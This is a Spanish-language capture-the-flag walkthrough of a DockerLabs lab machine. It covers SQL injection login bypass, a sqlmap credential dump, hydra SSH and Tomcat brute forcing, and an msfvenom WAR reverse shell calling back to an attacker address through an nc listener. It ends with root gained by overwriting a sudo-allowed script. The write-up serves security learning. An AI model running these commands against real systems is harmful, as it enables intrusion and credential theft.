## **Reconocimiento**

Realizo un escaneo de puertos con `nmap` para comprobar los puertos abiertos en el servidor.

```bash
nmap -p- --open --min-rate 5000 172.17.0.2 -n -Pn -oN allports
```

![picture](/assets/images/dockerlabs/crackoff3.png)

En el navegador me encuentro la siguiente web corriendo por el puerto `80`.

![picture](/assets/images/dockerlabs/crackoff4.png)

Realizando **Fuzzing** con `gobuster` encuentro los siguientes archivos `php` colgando de la web principal.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html,md -b 403,404 --no-error
```

![picture](/assets/images/dockerlabs/crackoff5.png)

Lo primero que he ido a ver es el panel de login, utilizando credenciales comunes no he obtenido resultado.

Intentando bypassear el panel, he obtenido resultado inyectando una `SQLi` en el campo del usuario, lo que me ha llevado al archivo `welcome.php`.

![picture](/assets/images/dockerlabs/crackoff6.png)

En el archivo `welcome.php` encuentro un panel de control de **admin** con un mensaje que dice que use herramientas como `sqlmap` para extraer información y analizar la seguridad.

![picture](/assets/images/dockerlabs/crackoff7.png)

Para ello voy a utilizar `Burpsuite` para interceptar la petición que se envía cuando intentamos acceder con credenciales en el panel login, una vez tenga la petición la guardaré para analizarla con `sqlmap`.

![picture](/assets/images/dockerlabs/crackoff8.png)

## **Explotación**

Utilizo `sqlmap` para lanzar inyecciones `SQL` en la petición guardada.

```bash
sqlmap -r req --dbs --batch --dump
```

Y al cabo de un rato mediante `SQLi` basadas en tiempo, obtiene 12 credenciales encontradas en la base de datos `crackofftrue_db`.

![picture](/assets/images/dockerlabs/crackoff9.png)

``Sqlmap`` nos guarda un archivo de las credenciales con una extensión `csv` de la siguiente manera "id,password,users".

![picture](/assets/images/dockerlabs/crackoff10.png)

Con el comando `awk` voy a separar la columna 2 (passwords), y la columna 3 (users), para enviarlas cada una de ellas a un archivo respectivamente.

- Passwords
	
	```bash
	cat users.csv | awk -F ',' '{print $2}' > passwords.txt
	```

- Users
	
	```bash
	cat users.csv | awk -F ',' '{print $3}' > users.txt 
	```

A continuación, con los 2 archivos, voy a realizar un ataque de fuerza bruta con `hydra` para intentar encontrar las credenciales de alguno de los usuarios vía `ssh`.

```bash
hydra -L users.txt -P passwords.txt 172.17.0.2 ssh -t 64
```

Y encuentra la contraseña del usuario **rosa**.

![picture](/assets/images/dockerlabs/crackoff11.png)

Accedo al servidor como el usuario **rosa** vía `ssh`.

```bash
ssh rosa@172.17.0.2
```

![picture](/assets/images/dockerlabs/crackoff12.png)

## **Escalada de privilegios**

#### **Movimiento lateral de usuarios**

Buscando por el servidor posibles vías de explotación, encuentro en la ruta `/var/www/alice_note` un archivo de texto, cuyo contenido podría ser una contraseña.

![picture](/assets/images/dockerlabs/crackoff13.png)

Intentado migrar de usuario a **alice**, no tengo resultado.

Listando los puertos abiertos de la máquina encuentro los siguientes.

![picture](/assets/images/dockerlabs/crackoff14.png)

Voy a realizar **Port Fordwarding** (redireccionamiento de puertos) con `ssh` para que el tráfico de los puertos abietos del servidor se redirijan a mi puerto ``8000``.

```bash
ssh -L 8000:127.0.0.1:8080 rosa@172.17.0.2
```

![picture](/assets/images/dockerlabs/crackoff15.png)

A continuación, introduzco en el navegador `127.0.0.1:8000`, y muestra el servicio del puerto `8080` del servidor, que es el servicio **Apache Tomcat**.

![picture](/assets/images/dockerlabs/crackoff16.png)

Realizando **Fuzzing** con `gobuster` encuentro los siguientes directorios.

```bash
gobuster dir -u http://127.0.0.1:8000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404 --no-error -k
```

![picture](/assets/images/dockerlabs/crackoff17.png)

La ruta `manager` es una aplicación web de administración llamada **Manager App**, que permite gestionar y administrar el servidor **Tomcat** a través de una interfaz web. Pero necesito las credenciales.

![picture](/assets/images/dockerlabs/crackoff29.png)

La idea es realizar fuerza bruta para encontrarlas, para ello utilizaré el siguiente script escrito en `python2` encontrado en [Github](https://gist.github.com/th3gundy/d562eb1ae5dc42d666d3aab761bd4d96).

Al ejecutarlo nos indica que parámetros hay que introducir.

![picture](/assets/images/dockerlabs/crackoff18.png)

Pongo los parámetros correspondientes y presionamos una tecla.

![picture](/assets/images/dockerlabs/crackoff19.png)

Empieza a probar todas las posibles credenciales con los archivos indicados, cuando encuentra unas credenciales válidas las muestra, pero como saca por pantalla todas las pruebas realizadas sean o no válidas, no son fáciles de ver, aun así cuando acaba nos indica cuales son las credenciales encontradas.

![picture](/assets/images/dockerlabs/crackoff20.png)

Accedo con las credenciales y estoy dentro de la aplicación de administración.

![picture](/assets/images/dockerlabs/crackoff21.png)

Para poder obtener una **Reverse Shell** en un servidor de **Apache Tomcat** necesitaré crear un ``payload`` con `msfvenom`, la idea es empaquetarlo en un archivo **WAR**, que es un tipo de archivo comprimido.

**Apache Tomcat** ejecuta aplicaciones web escritas en **Java**, y por eso los archivos que maneja son principalmente aplicaciones Java empaquetadas en un formato **WAR** (Web Application Archive).

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=9001 -f war > shell.war
```

![picture](/assets/images/dockerlabs/crackoff22.png)

Subida del archivo.

![picture](/assets/images/dockerlabs/crackoff23.png)

Compruebo que se ha subido correctamente.

![picture](/assets/images/dockerlabs/crackoff24.png)

Antes de clicar sobre el archivo subido, ejecuto un **Listener** por el puerto `9001` en mi máquina local con `netcat`.

- Listener
	
	```bash
	nc -lnvp 9001
	```


Clico en el archivo `shell`, y automáticamente obtengo una **terminal** interactiva en mi máquina local.

![picture](/assets/images/dockerlabs/crackoff25.png)

Realizo un tratamiento de la **TTY** para tener una **terminal** más limpia.

#### **Escalada de privilegios a root**

Listo los permios de `sudo` del usuario **tomcat**, y puedo ejecutar el script `/opt/tomcat/bin/catalina.sh` sin el uso de contraseña.

![picture](/assets/images/dockerlabs/crackoff26.png)

Al tener permisos de escritura, voy a modificarlo para obtener una `shell` del tipo `bash`.

```bash
echo "/bin/bash" > /opt/tomcat/bin/catalina.sh
```

![picture](/assets/images/dockerlabs/crackoff27.png)

Ejecuto el script, y migro al usuario **root**.

![picture](/assets/images/dockerlabs/crackoff28.png)
